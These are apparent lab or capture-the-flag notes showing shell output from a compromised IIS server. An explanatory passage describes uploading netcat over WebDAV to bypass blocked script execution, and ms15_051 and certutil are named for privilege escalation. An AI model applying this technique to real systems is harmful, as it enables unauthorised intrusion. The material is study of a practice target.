+04/12/2017  05:27 PM    <DIR>          ADFS
+04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
+04/12/2017  05:04 PM                 0 CONFIG.SYS
+04/12/2017  10:19 PM    <DIR>          Documents and Settings
+04/12/2017  05:17 PM    <DIR>          FPSE_search
+04/12/2017  05:17 PM    <DIR>          Inetpub
+12/24/2017  08:21 PM    <DIR>          Program Files
+09/16/2021  02:49 PM    <DIR>          WINDOWS
+04/12/2017  05:05 PM    <DIR>          wmpub
+               2 File(s)              0 bytes
+               7 Dir(s)   1,323,089,920 bytes free
+
+
+C:\>cd "Documents and Settings"
+cd "Documents and Settings"
+
+C:\Documents and Settings>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 424C-F32D
+
+ Directory of C:\Documents and Settings
+
+04/12/2017  10:19 PM    <DIR>          .
+04/12/2017  10:19 PM    <DIR>          ..
+04/12/2017  09:48 PM    <DIR>          Administrator
+04/12/2017  05:03 PM    <DIR>          All Users
+04/12/2017  10:19 PM    <DIR>          Lakis
+               0 File(s)              0 bytes
+               5 Dir(s)   1,323,085,824 bytes free
+
+C:\Documents and Settings>cd Administrator
+cd Administrator
+Access is denied.
+
+C:\Documents and Settings>whoami
+whoami
+nt authority\network service
+
+C:\Documents and Settings>
+
+
+
+
+
+
+
+
+
+What was fundamentally different
+
+You moved from trying to execute commands via the ASP interpreter (WScript.Shell.Exec inside ASP) to actually running a native executable that you uploaded to disk (netcat). Those are different trust/permission paths:
+WScript.Shell.Exec inside ASP is a COM call that can be blocked by server policy, script restrictions, or the IIS worker account. That produced the 80070005 Access is denied errors you saw.
+Running a native binary you uploaded (via a batch or by ShellExecute/cmd) uses the OS process-launch path. In some IIS setups the worker account can spawn new processes if the call goes through a path the OS allows (for instance running a .bat via cmd), even when Exec/Exec-like COM calls are restricted. In short: native binary invocation can succeed where the COM Exec path fails.
+You also used WebDAV to place the binary into a location the server can access. Even if the webserver refuses to serve .exe over HTTP, the file can still exist on disk and be invoked locally by the IIS process.
+
+
+
+
+
+The intended exploit in this case is ms15_051_client_copy_image, which immediately grants a
+root shell
+
+we could possible certutil this bad boy in,
+but we will move on.
+this was cool enough for now.
+
